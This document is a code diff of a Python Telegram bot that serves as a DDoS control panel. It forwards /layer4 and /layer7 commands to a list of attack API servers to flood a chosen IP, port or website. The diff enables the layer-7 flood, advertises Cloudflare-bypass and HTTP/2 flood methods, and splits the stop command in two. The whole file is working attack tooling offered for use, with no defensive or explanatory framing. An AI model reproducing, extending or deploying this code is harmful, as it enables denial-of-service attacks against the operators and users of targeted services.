@@ -1,23 +1,30 @@
-from telegram.ext import Updater, CommandHandler, Filters
+from telegram.ext import Updater, CommandHandler, Filters, CallbackContext
 import requests
 import threading
 import socket
 group_id = -1002005767506
 admin_id = 5561757248
 api = [
-    "ip:port"
+    "IP:Port"
 ]
 def start(update, context):
-    update.message.reply_text("👋Hello User\n➤Use /layer4 to attack IP\n➤Use /layer7 to attack Website\n➤Use /kill to stop attack\n➤Use /info to view IP or Hostname information")
+    update.message.reply_text("👋Hello User\n➤Use /layer4 to attack IP\n➤Use /layer7 to attack Website\n➤Use /info to view IP or Hostname information")
 def send_request(url):
     requests.get(url)
-def kill(update, context):
+def kill4(update, context):
     if update.message.chat_id != admin_id and update.message.chat_id != group_id:
         return
     for url in api:
-        threading.Thread(target=send_request, args=(f"http://{url}/action=kill",)).start()
-    print(f"Kill All DDoS Process")
-    update.message.reply_text(f"✅Kill All DDoS Process Success")
+        threading.Thread(target=send_request, args=(f"http://{url}?type=l4&action=kill",)).start()
+    print(f"Kill All DDoS Process Layer 4")
+    update.message.reply_text(f"✅Kill All DDoS Process Layer4 Success")
+def kill7(update, context):
+    if update.message.chat_id != admin_id and update.message.chat_id != group_id:
+        return
+    for url in api:
+        threading.Thread(target=send_request, args=(f"http://{url}?type=l7&action=kill",)).start()
+    print(f"Kill All DDoS Process Layer 7")
+    update.message.reply_text(f"✅Kill All DDoS Process Layer7 Success")    
 def layer4(update, context):
     if update.message.chat_id != admin_id and update.message.chat_id != group_id:
         return
@@ -29,28 +36,28 @@ def layer4(update, context):
     ip, port, time = args
 
     for url in api:
-        threading.Thread(target=send_request, args=(f"http://{url}/?ip={ip}&port={port}&thread=100&time={time}",)).start()
+        threading.Thread(target=send_request, args=(f"http://{url}/?type=l4&ip={ip}&port={port}&thread=100&time={time}",)).start()
 
     print(f"Attack {ip}:{port} in {time} second")
-    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤IP: {ip}\n  ┣➤Port: {port}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-ping?host={ip}\n⛔️Click To Stop Attack: /kill")
+    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤IP: {ip}\n  ┣➤Port: {port}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-ping?host={ip}\n⛔️Click To Stop Attack: /kill4")
 
 def layer7(update, context):
-    update.message.reply_text("✨Upcoming feature")
-#    if update.message.chat_id != admin_id and update.message.chat_id != group_id:
-#        return
-#    args = context.args
-#    if len(args) != 3:
-#        update.message.reply_text("Usage: /layer7 [method] [url] [time]")
-#        return
-#
-#    web, method, time = args
-#
-#    for url in api:
-#        threading.Thread(target=send_request, args=(f"http://{url}/?ip={web}&port={port}&thread=50&time={time}",)).start()
-#
-#    print(f"Attack {ip}:{port} in {time} second")
-#    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤URL: {web}\n  ┣➤Method: {method}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-http?host={web}\n⛔️Click To Stop Attack: /kill")
-#
+#    update.message.reply_text("✨Upcoming feature")
+    if update.message.chat_id != admin_id and update.message.chat_id != group_id:
+        return
+    args = context.args
+    if len(args) != 3:
+        update.message.reply_text("Usage: /layer7 [method] [url] [time]\n\nMethod list:\n- `http` : Normal request\n- `cfb`   : Bypass Cloudflare\n- `tls`   : HTTP/2 flood, use TLSv1.3 ", parse_mode='Markdown')
+        return
+
+    method, web, time = args
+
+    for url in api:
+        threading.Thread(target=send_request, args=(f"http://{url}/?type=l7&url={web}&method={method}&thread=50&time={time}",)).start()
+
+    print(f"Attack {url} in {time} second with method {method}")
+    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤URL: {web}\n  ┣➤Method: {method}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-http?host={web}\n⛔️Click To Stop Attack: /kill7")
+
 def info(update, context):
     args = context.args
     if not args:
@@ -90,10 +97,11 @@ def info(update, context):
     except Exception as e:
         update.message.reply_text(f"An error occurred: {e}")
 def main():
-    updater = Updater("TOKEN_BOT_TELEGRAM", use_context=True)
+    updater = Updater("TOKEN", use_context=True)
     dp = updater.dispatcher
     dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("kill", kill, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
+    dp.add_handler(CommandHandler("kill4", kill4, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
+    dp.add_handler(CommandHandler("kill7", kill7, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
     dp.add_handler(CommandHandler("layer4", layer4, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
     dp.add_handler(CommandHandler("layer7", layer7, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
     dp.add_handler(CommandHandler("info", info, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
